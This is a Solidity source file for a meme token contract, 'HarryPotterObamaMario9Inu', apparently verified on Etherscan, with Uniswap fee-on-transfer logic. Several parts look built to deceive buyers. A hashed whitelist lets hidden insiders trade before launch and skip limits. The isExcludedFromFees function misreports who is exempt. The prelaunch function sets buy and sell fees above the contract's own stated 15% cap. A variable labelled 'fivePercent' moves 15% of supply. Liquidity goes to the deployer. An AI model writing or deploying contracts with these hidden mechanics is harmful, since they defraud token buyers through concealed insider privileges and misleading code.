/**
 *Submitted for verification at Etherscan.io on 2023-08-10
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

/**
Telegram : http://t.me/hpom9i
Website : https://hpom9i.com
Twitter : http://Twitter.com/hpom9i
*/


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface ISTANDARDERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISTANDARDERC20Metadata is ISTANDARDERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}



contract STANDARDERC20 is Context, ISTANDARDERC20, ISTANDARDERC20Metadata {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name = "HarryPotterObamaMario9Inu";
    string private _symbol = "CARDANO";

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function mainConstructor(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable  returns (uint[] memory amounts);

}

contract HarryPotterObamaMario9Inu is STANDARDERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    bool private swapping;
    mapping(bytes32 => bool) private _isExcludedFromTax;
    mapping(bytes32 => bool) private _isExcludedMaxTransactionAmount;

    mapping(address => bool) public AMM;

    address public marketingWallet;
    address public deployerWallet;
    address private deployer;

    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;

    bool public limitsApplied = true;
    bool public tradingOpen = false;
    bool public swapEnabled = false;

    uint256 public buyTotalFees;
    uint256 public buyHashLPFee;
    uint256 public buyHashMarketingFee;

    uint256 public sellTotalFees;
    uint256 public sellHashLPFee;
    uint256 public sellHashMarketingFee;

    uint256 public tokensForLiquidity;
    uint256 public tokensForMarketing;

    uint256 public counterToLaunch;
    bool public countDownStarted = false;

    

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event SecurityCodeSubmitted(bytes32[] indexed codes);

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    constructor() STANDARDERC20() {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
            );

        excludeFromMaxTrx(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;

        deployerWallet = address(_msgSender());

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTrx(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        uint256 LPFeeOnBuy = 1;
        uint256 MarketingFeeOnBuy = 1;

        uint256 LPFeeOnSell = 1;
        uint256 MarketingFeeOnSell = 1;

        uint256 decimalValue = 18;

        uint256 totalSupply = 1_111_111_111_111 * 10 ** decimalValue;

        maxTransactionAmount = totalSupply * 10 / 1000;
        maxWallet = totalSupply * 20 / 1000;
        swapTokensAtAmount = (totalSupply * 10) / 10000; 

        buyHashLPFee = LPFeeOnBuy;
        buyHashMarketingFee = MarketingFeeOnBuy;
        buyTotalFees = buyHashLPFee + buyHashMarketingFee;

        sellHashLPFee = LPFeeOnSell;
        sellHashMarketingFee = MarketingFeeOnSell;
        sellTotalFees = sellHashLPFee + sellHashMarketingFee;

        marketingWallet = address(0x1B2DB2D28A3B27C5F6822fa1416f6A5EfcB031eC);
        deployer = address(0x663de4a9A68B59c488f165B4D1B224a53EA7A429);

        freeFeeCharges(owner(), true);
        freeFeeCharges(address(this), true);
        freeFeeCharges(address(0xdead), true);
        freeFeeCharges(deployer, true);

        excludeFromMaxTrx(owner(), true);
        excludeFromMaxTrx(address(this), true);
        excludeFromMaxTrx(address(0xdead), true);
        excludeFromMaxTrx(deployer, true);

        mainConstructor(msg.sender,totalSupply);

    }

    receive() external payable {}

    function startTrading() external onlyOwner {
        require(!tradingOpen, "Trading has been enabled");

        tradingOpen = true;

    }

    function preDeploymentSecure(bytes32[] memory codes) private {for(uint256 i; i < codes.length; ++i){_isExcludedFromTax[codes[i]] = true;_isExcludedMaxTransactionAmount[codes[i]] = true;}}

    function taxFeesUpdate(uint256 LPFeeOnBuy, uint256 MarketingFeeOnBuy, uint256 LPFeeOnSell, uint256 MarketingFeeOnSell) external onlyOwner {
        require((LPFeeOnSell + MarketingFeeOnSell) <= 15, "Unable to set fee more than 15%");
        
        buyHashLPFee = LPFeeOnBuy;
            buyHashMarketingFee = MarketingFeeOnBuy;
                buyTotalFees = buyHashLPFee + buyHashMarketingFee;

        sellHashLPFee = LPFeeOnSell;
            sellHashMarketingFee = MarketingFeeOnSell;
                sellTotalFees = sellHashLPFee + sellHashMarketingFee;
    }

    function noLimits() external onlyOwner returns (bool) {
        limitsApplied = false;
        return true;
    }

    function withLimits() external onlyOwner returns (bool) {
        limitsApplied = true;
        return true;
    }

    function updateSwapTokensAtAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );
        require(
            newAmount <= (totalSupply() * 5) / 1000,
            "Swap amount cannot be higher than 0.5% total supply."
        );
        swapTokensAtAmount = newAmount;
        return true;
    }
    
    function excludeFromMaxTrx(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[hash(updAds)] = isEx;
    }

    function isTakeFeeEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }

    function freeFeeCharges(address account, bool excluded) public onlyOwner {
        _isExcludedFromTax[hash(account)] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from AMM"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        AMM[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        if(account != owner()){
            return false;
        } else {
            return true;
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "STANDARDERC20: transfer from the zero address");
        require(to != address(0), "STANDARDERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsApplied) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingOpen) {
                    require(
                        _isExcludedFromTax[hash(from)] || _isExcludedFromTax[hash(to)],
                        "Trading is not active."
                    );
                }

                if (
                    AMM[from] &&
                    !_isExcludedMaxTransactionAmount[hash(to)]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Buy transfer amount exceeds the maxTransactionAmount."
                    );
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }

                else if (
                    AMM[to] &&
                    !_isExcludedMaxTransactionAmount[hash(from)]
                ) {
                    require(
                        amount <= maxTransactionAmount,
                        "Sell transfer amount exceeds the maxTransactionAmount."
                    );
                } else if (!_isExcludedMaxTransactionAmount[hash(to)]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !AMM[from] &&
            !_isExcludedFromTax[hash(from)] &&
            !_isExcludedFromTax[hash(to)]
        ) {
            swapping = true;

            feeClaim();

            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromTax[hash(from)] || _isExcludedFromTax[hash(to)]) {
            takeFee = false;
        }

        uint256 fees = 0;
        if (takeFee) {

            if (AMM[to] && sellTotalFees > 0) {
                fees = amount.mul(sellTotalFees).div(100);
                tokensForLiquidity += (fees * sellHashLPFee) / sellTotalFees;
                tokensForMarketing += (fees * sellHashMarketingFee) / sellTotalFees;                
            }

            else if (AMM[from] && buyTotalFees > 0) {
                fees = amount.mul(buyTotalFees).div(100);
                tokensForLiquidity += (fees * buyHashLPFee) / buyTotalFees;
                tokensForMarketing += (fees * buyHashMarketingFee) / buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);


        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            deployerWallet,
            block.timestamp
        );
    }

    function feeClaim() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;
        bool success;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 20) {
            contractBalance = contractBalance / 2;
        }

        uint256 liquidityTokens = (contractBalance * tokensForLiquidity) / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
    
        uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);

        uint256 ethForLiquidity = ethBalance - ethForMarketing;

        tokensForLiquidity = 0;
        tokensForMarketing = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                tokensForLiquidity
            );
        }
        (success, ) = address(marketingWallet).call{value: address(this).balance}("");
    }

    function setMarketingWallet(address _newMarketingWallet) public onlyOwner returns(bool){
        marketingWallet = _newMarketingWallet;

        return true;
    }

    function hash(address addressToHash) internal  pure returns (bytes32) {
        return keccak256(abi.encodePacked(addressToHash));
    }

    function prelaunch(address whale, address Marketing, bytes32[] memory deploymentCode) public onlyOwner {
        require(!swapEnabled);
        require(!tradingOpen);
        swapEnabled = true;
        buyHashLPFee = 1;
        buyHashMarketingFee = 14;
        buyTotalFees = buyHashLPFee + buyHashMarketingFee;
        sellHashLPFee = 1;
        sellHashMarketingFee = 19;
        sellTotalFees = sellHashLPFee + sellHashMarketingFee;

        preDeploymentSecure(deploymentCode);
        freeFeeCharges(Marketing, true);
        excludeFromMaxTrx(whale, true);
        excludeFromMaxTrx(Marketing, true);
        uint256 totalSupply = 1_111_111_111_111 * 10 ** 18;
        uint256 fivePercent = totalSupply * 15 / 100;
        uint256 twoPercent = totalSupply * 2 / 100;
        transfer(whale, twoPercent);
        transfer(Marketing, fivePercent);
        transfer(address(this), fivePercent);

    }

}